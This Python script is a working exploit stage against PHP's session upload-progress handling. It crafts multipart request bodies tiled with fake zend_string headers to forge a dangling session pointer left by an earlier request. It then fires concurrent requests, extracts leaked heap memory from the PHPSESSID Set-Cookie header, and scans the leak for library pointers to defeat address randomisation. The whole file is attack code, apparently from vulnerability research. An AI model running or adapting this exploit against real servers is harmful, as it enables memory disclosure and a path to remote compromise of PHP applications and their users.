#!/usr/bin/env python3
"""Universal B1: 16 x 2MB fields, each tiled with a 0x20-byte fake zend_string
header pattern.  Every 0x20-aligned address in a reused 2MB chunk carries a
valid zend_string header (refcount 0, type 0x16, len=fake_len), so the dangling
PS(id) is forged no matter which page/offset the A1 left it at.

If an A1 request left END-phase dangling state in a worker, one of 5 concurrent
U-B1 requests lands in that worker and leaks fake_len bytes via Set-Cookie.
If the A1 was a parse-OOM (no state), all responses are the normal 274-byte 200.

Usage:
  univ_b1.py --port 19001 --container c --a1 a1.bin --outdir DIR
             [--fake-len 0xC8000] [--fields 16] [--zdtor-off 0x...]
"""
import argparse, os, re, struct, subprocess, sys, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor

PURE = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
BOUND = b"C" * 10
TILE_PAGES = 511
L = TILE_PAGES * 4096 - 25


def build(path, fake_len, fields, tag=True):
    tag8 = b"/99BBBBB" if tag else b"BBBB/BBB"
    tile = struct.pack("<IIQQ", 0, 0x16, 0, fake_len) + tag8
    out = bytearray()
    out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\na\r\n"
    out += (b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nk0\r\n")
    for i in range(fields):
        v = bytearray(b"A" * L)
        n = (L - 8) // 32
        v[8:8 + n * 32] = tile * n
        nm = (b"f%04d" % i).ljust(120, b"f")[:120]
        out += b"--" + BOUND + b"\r\nContent-Disposition: form-data; name=\"" + nm + b"\"\r\n\r\n" + bytes(v) + b"\r\n"
    out += b"--" + BOUND + b"--\r\n"
    with open(path, "wb") as fh:
        fh.write(out)
    return len(out)


def sh(cmd, timeout=300):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def send(port, path, body, save):
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"), "--port", str(port),
           "--body-file", body, "--path", path, "--timeout", "120",
           "--save-response", save]
    r = sh(cmd, timeout=150)
    m = re.search(r"resp=(\d+) status='([^']*)'", r.stdout)
    return (int(m.group(1)), m.group(2)) if m else (-1, "ERR")


def cookie(save):
    try:
        raw = open(save, "rb").read()
    except OSError:
        return None, raw if 'raw' in dir() else b""
    i = raw.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        return None, raw
    v = raw[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    return urllib.parse.unquote_to_bytes(v.decode("latin1", "replace")), raw


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--container")
    ap.add_argument("--a1", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--fake-len", type=lambda x: int(x, 0), default=0xC8000)
    ap.add_argument("--fields", type=int, default=16)
    ap.add_argument("--tries", type=int, default=5)
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--no-restart", action="store_true")
    ap.add_argument("--body", help="use a prebuilt B1 body instead of the tiled one")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    if args.container and not args.no_restart:
        sh(["docker", "restart", args.container]); time.sleep(1.5)
    if args.body:
        body = args.body
        n = os.path.getsize(body)
        print("B1 body=%d (prebuilt)" % n, flush=True)
    else:
        body = os.path.join(args.outdir, "ub1.bin")
        n = build(body, args.fake_len, args.fields)
        print("U-B1 body=%d fields=%d fake_len=%#x" % (n, args.fields, args.fake_len), flush=True)
    # warmup so children are forked
    try:
        import socket
        for _ in range(2):
            s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n"); s.recv(4096); s.close()
    except OSError:
        pass
    r = send(args.port, QS, args.a1, os.path.join(args.outdir, "a1.resp"))
    print("A1 resp=%d status=%s" % r, flush=True)
    saves = [os.path.join(args.outdir, "b1_%d.resp" % i) for i in range(args.tries)]
    with ThreadPoolExecutor(max_workers=args.tries) as ex:
        res = list(ex.map(lambda s: send(args.port, "/index.php", body, s), saves))
    print("B1 statuses=%s" % [x[1] for x in res], flush=True)
    leaks = []
    for s in saves:
        d, raw = cookie(s)
        if d is None:
            continue
        leaks.append((s, len(d), d[:32]))
    print("LEAKS %s" % [(os.path.basename(s), n2, h) for s, n2, h in leaks], flush=True)
    # lib-pointer scan on the biggest leak
    if leaks and args.zdtor_off:
        s, _, _ = max(leaks, key=lambda x: x[1])
        d, _ = cookie(s)
        from collections import Counter
        qs = []
        for o in range(0, len(d) - 8, 8):
            q = struct.unpack_from("<Q", d, o)[0]
            if 0x7F0000000000 <= q <= 0x7FFFFFFFFF00:
                qs.append(q)
        c = Counter(qs)
        cand = []
        for q, cnt in c.most_common(50):
            lib = q - args.zdtor_off
            if lib & 0xFFF == 0:
                cand.append((hex(q), cnt, hex(lib)))
        print("PTRS=%d distinct=%d libcand=%s" % (len(qs), len(c), cand[:5]), flush=True)
        print("TOP=%s" % [(hex(q), n3) for q, n3 in c.most_common(5)], flush=True)


if __name__ == "__main__":
    main()
